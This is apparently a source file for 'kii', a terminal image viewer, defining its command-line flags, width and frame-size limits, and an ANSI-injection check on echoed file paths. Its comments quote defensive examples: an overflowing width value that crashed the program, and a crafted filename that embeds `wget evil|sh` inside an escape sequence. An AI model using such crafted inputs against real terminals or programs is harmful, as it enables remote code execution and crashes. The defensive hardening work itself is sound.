# cli.cyr — kii's flag registration + lightweight validation.
#
# Split out of main.cyr at M1 sub-bite (d) so the unit tests
# (tests/cli.tcyr) and the fuzz harness (tests/kii.fcyr) can wire
# kii's exact flag set into a cmdit context without linking the
# program entry point. Stdlib and cmdit are auto-included via
# cyrius.cyml.
#
# main.cyr keeps the I/O glue (print_version, print_usage, dispatch)
# — those are intertwined with stdout/stderr and don't lend themselves
# to in-process testing. The pure parse + validate pieces, and the
# exact text of each diagnostic line, live here.

# ---- exit codes ---------------------------------------------------
# Mirrors the AGNOS userland convention (anuenue, hapi, bannermanor):
#   0 = normal exit (incl. --help / --version paths)
#   1 = runtime error (decode fail, IO error) — used at M2+
#   2 = usage error (unknown flag, missing value, bad int, bad color)
# Upper bound on --width, enforced in main BEFORE the value reaches the
# geometry layer (P-1, v1.5.1). Not a cosmetic cap: `--width N` flows
# unvalidated into `_kii_compute_target_geometry` -> `downscale_to_rgb`,
# where the allocation size is the unchecked 64-bit product
# `dst_w * dst_h * 3`. A width above ~2.5e9 makes that product WRAP; a
# wrapped small-positive value passes alloc()'s own `size <= 0` /
# `size > ALLOC_MAX` guards, and the resampler then writes megabytes past
# a handful of allocated bytes. `kii --width 4611686018427387902 one.png`
# (a 1x1 source) wrapped to a 12-byte alloc and SIGSEGV'd, corrupting the
# bump heap on the way out — on BOTH the half-block and --mode ascii lanes.
#
# 100000 columns is ~500x the widest real terminal capture and still leaves
# every downstream product provably below 2^63, so the wrap is unreachable
# rather than merely unlikely. CLAUDE.md: "Do not trust external data
# (image files, args) without validation."
var KII_MAX_COLS   = 100000;

# Upper bound on the frame itself, in character cells (P(-1), v1.6.4).
# KII_MAX_COLS bounds the width, but `--width N` derives the row count from
# the image's aspect with no limit, so a narrow image turned an ordinary
# width into millions of rows: a 392-byte 1x65535 GIF at `--width 80` wrote
# ~4.4 GB of ANSI over minutes at 1.6 GB RSS. 1,048,576 cells (1024 x 1024)
# is far past any terminal, still allows a deliberate large capture
# (`--width 1000` of a square image is 500,000 cells), and bounds the worst
# case at roughly 26 MB of output and 19 MB of buffers. (A 4M-cell cap was
# tried first: the same GIF at `--width 8` still wrote 45 MB.)
var KII_MAX_CELLS  = 1048576;

var KII_EXIT_OK    = 0;
var KII_EXIT_RUN   = 1;
var KII_EXIT_USAGE = 2;

# ---- flag indices ------------------------------------------------
# Populated by kii_register_flags(fs). The initial -1 marks "not registered
# yet"; cmdit's getters return 0 (not an error) for a bad index, so reading
# a flag before kii_register_flags gets 0, never a crash or a wrong entry.
# --help/--version are auto-registered by cmdit_new (cmdit_parse returns
# CMDIT_HELP / CMDIT_VERSION), so kii does not track their indices —
# width/color/verbose/mode take indices 2/3/4/5 (cmdit's auto help/version
# are 0/1).
var KII_F_WIDTH   = 0 - 1;
var KII_F_COLOR   = 0 - 1;
var KII_F_VERBOSE = 0 - 1;
var KII_F_MODE    = 0 - 1;

# Register kii's flag surface into a cmdit context `fs` (caller owns
# cmdit_new + cmdit_parse). cmdit_new already registered --help/-h (h=104)
# and --version/-V (V=86), so kii adds width/color/verbose/mode. Short codes
# are ASCII bytes: w = 119, c = 99 (mirror chafa's `-w`/`-c`). Defaults:
# --width 0 is the M6 sentinel for "match terminal"; --color 16 picks the
# higher fidelity tier within v1.0 scope. cmdit_bool takes no default (always 0).
fn kii_register_flags(fs): i64 {
    KII_F_WIDTH   = cmdit_int (fs, 119, "width",   0,  "output width in columns (0 = match terminal)");
    KII_F_COLOR   = cmdit_int (fs,  99, "color",   16, "color tier: 8 or 16 (tier-2 modes post-v1)");
    # `v` (118) was reserved for --verbose at M1; activated at M5
    # alongside the ANSI emit. With the frame now occupying stdout,
    # the M4 dimensions / format summary moves behind this flag and
    # rides stderr — pipe-pure by default.
    KII_F_VERBOSE = cmdit_bool(fs, 118, "verbose", "print decode summary to stderr after the frame");
    # --mode / -m (109): rendering lane. "halfblock" (default) = the ▀ fg/bg
    # floor; "ascii" = text-glyph art (shape-vector matching since v1.3.1,
    # colored fg). See ADR 0007. cmdit appends "(default: halfblock)" itself,
    # so the help text does not repeat it (it did through v1.6.3).
    KII_F_MODE    = cmdit_str (fs, 109, "mode", "halfblock", "render mode: halfblock or ascii");
    return 0;
}

# --color validation. Only 8 or 16 are valid within tier-1 scope;
# 256 / truecolor are post-v1 (CLAUDE.md color-tier discipline).
# Returns 1 if valid, 0 otherwise.
fn kii_validate_color(color): i64 {
    if (color == 8)  { return 1; }
    if (color == 16) { return 1; }
    return 0;
}

# --mode validation. "halfblock" (the ▀ floor) and "ascii" (text glyphs)
# are the two rendering lanes. Returns 1 if valid, 0 otherwise.
fn kii_validate_mode(mode): i64 {
    if (streq(mode, "halfblock") == 1) { return 1; }
    if (streq(mode, "ascii") == 1)     { return 1; }
    return 0;
}

# True (1) iff `mode` selects the character-glyph lane. (halfblock is the
# default, so a null/empty/unknown mode is treated as NOT ascii — but
# kii_validate_mode rejects unknowns before this is reached.)
fn kii_mode_is_ascii(mode): i64 {
    return streq(mode, "ascii");
}

# --width check: 0 if `w` is usable (0 = fit the terminal, or 1 to
# KII_MAX_COLS), else the exact usage line main prints. P(-1) (v1.6.4) added
# the negative case: `--width -5` used to fall through main's `width > 0`
# test and silently mean "fit the terminal", exit 0. Both figures in the
# text are pinned against KII_MAX_COLS in tests/cli.tcyr.
fn kii_width_error_line(w): i64 {
    if (w > KII_MAX_COLS) { return "kii: --width exceeds the maximum of 100000 columns\n"; }
    if (w < 0)            { return "kii: --width must not be negative (0 = fit the terminal)\n"; }
    return 0;
}

# Frame-size predicate (P(-1), v1.6.4): 1 if a `cols` x `rows` character
# frame is within KII_MAX_CELLS, 0 if not. Division form, so the check cannot
# itself overflow for any i64 input; non-positive dimensions are 0 (the
# geometry layer never produces them, but the predicate does not assume it).
fn kii_frame_cells_ok(cols, rows): i64 {
    if (cols <= 0 || rows <= 0) { return 0; }
    if (cols > KII_MAX_CELLS) { return 0; }
    if (rows > KII_MAX_CELLS / cols) { return 0; }
    return 1;
}

# ---- parse-error diagnostics ---------------------------------------
# The stderr line main prints when cmdit_parse returns CMDIT_RESULT_ERR,
# "kii: " prefix and newline included, so tests/cli.tcyr pins the exact
# bytes. Codes kii's flag set cannot produce (REQUIRED_MISSING, BAD_ENUM,
# OUT_OF_RANGE, the verb and positional-count codes, REPEATED) share the
# generic last line.
#
# v1.6.2: cmdit 1.3.x added three codes that kii's flag set CAN reach, and
# through v1.6.1 each fell to the generic line:
#   - UNEXPECTED_VALUE (11, cmdit 1.3.1): a bool flag given `=value`. Only
#     the long forms reach it (`-v=1` is BUNDLED), so main names the flag
#     through kii_err_flag_name; this is the fallback when no flag is named.
#   - NOMEM (12, cmdit 1.3.1): a refused allocation, including a 0 handle
#     from cmdit_new.
#   - ARGV (13, cmdit 1.3.2): the stdlib could not read the whole command
#     line (over 2 MiB, or no /proc). cmdit refuses to parse a prefix.
fn kii_parse_error_line(err): i64 {
    if (err == CMDIT_ERR_UNKNOWN)          { return "kii: unknown flag\n"; }
    if (err == CMDIT_ERR_MISSING_VALUE)    { return "kii: flag missing value\n"; }
    if (err == CMDIT_ERR_BAD_INT)          { return "kii: bad integer value\n"; }
    if (err == CMDIT_ERR_BUNDLED)          { return "kii: short flags take no attached value and cannot be bundled (use -w 40 -v, not -w40 or -wv)\n"; }
    if (err == CMDIT_ERR_UNEXPECTED_VALUE) { return "kii: flag takes no value\n"; }
    if (err == CMDIT_ERR_NOMEM)            { return "kii: out of memory\n"; }
    if (err == CMDIT_ERR_ARGV)             { return "kii: could not read the full command line\n"; }
    return "kii: argument parse error\n";
}

# Long name (without `--`) of the flag the last parse error names, or 0 when
# it names none. It is the registered literal ("verbose", or cmdit's auto
# "help" / "version"), never argv bytes, so main may echo it unescaped.
fn kii_err_flag_name(fs): i64 {
    var idx = cmdit_err_flag(fs);
    if (idx < 0) { return 0; }
    return cmdit_flag_long_at(fs, idx);
}

# ANSI-injection defense for stderr path-echo. Returns 1 if `path`
# contains anything that must NOT be emitted verbatim to a terminal-
# attached fd; 0 if the path is safe to echo. The caller in main.cyr
# (_eprint_path_safe) prints "<path containing control bytes —
# suppressed>" instead of the path when this returns 1. Pure predicate
# (no I/O), so tests/cli.tcyr and tests/kii.fcyr drive it directly.
#
# Threat model: docs/audit/2026-05-22-audit.md § Finding 6. A filename
# like `/tmp/\x1b]2;wget evil|sh\x07.png` would otherwise reach the
# user's terminal through fd 2 as an OSC injection (CVE-2021-25743
# analog). The P-1 sweep (v1.5.1) found the 8-bit C1 spelling of the
# same attack (`\x9D 0;PWNED \x9C`) walking through a C0-only guard.
#
# v1.6.0: the rule is darshana's `tty_has_ctl` (1.3.0), the reject-only
# twin of its `tty_sanitize_buf`, in UTF-8 mode with TAB and LF kept.
# darshana shaped that call on THIS function, so the rule is the one
# kii already had, which is:
#   - every C0 control (0x00-0x1F) except TAB and LF, and DEL (0x7F);
#     ESC can never be kept;
#   - C1 controls in both spellings: a raw 0x80-0x9F where a lead byte
#     belongs, and the UTF-8 encoding C2 80-C2 9F;
#   - any malformed UTF-8 — a stray continuation byte, a 0xC0, 0xC1 or
#     0xF5-0xFF lead, a sequence cut off by the end of the string —
# plus one deliberate tightening: darshana validates strict RFC 3629,
# so the overlong 3- and 4-byte forms (E0 80-9F .., F0 80-8F ..),
# UTF-16 surrogates (ED A0-BF ..) and code points past U+10FFFF
# (F4 90-BF ..) are refused too. kii's own walk accepted all four,
# because it checked only that each continuation byte was 0x80-0xBF.
# None is valid UTF-8, so no legitimate filename produces one, and the
# overlong forms are a live vector, not a formality: E0 82 9B is an
# overlong spelling of U+009B (CSI), which a lenient UTF-8 decoder in
# the terminal turns back into the control the C1 rule exists to stop.
#
# `tty_has_ctl` takes (ptr, len); the length comes from strlen, so the
# string is checked up to its NUL — exactly the bytes _eprint writes.
# Its -1 (negative len, or an unknown mode) cannot happen with these
# arguments; it is treated as unsafe anyway, so the guard fails closed.
fn kii_path_has_control_bytes(path): i64 {
    var rc = tty_has_ctl(path, strlen(path), TTY_SANITIZE_UTF8, TTY_KEEP_TAB | TTY_KEEP_LF);
    if (rc == 0) { return 0; }
    return 1;
}
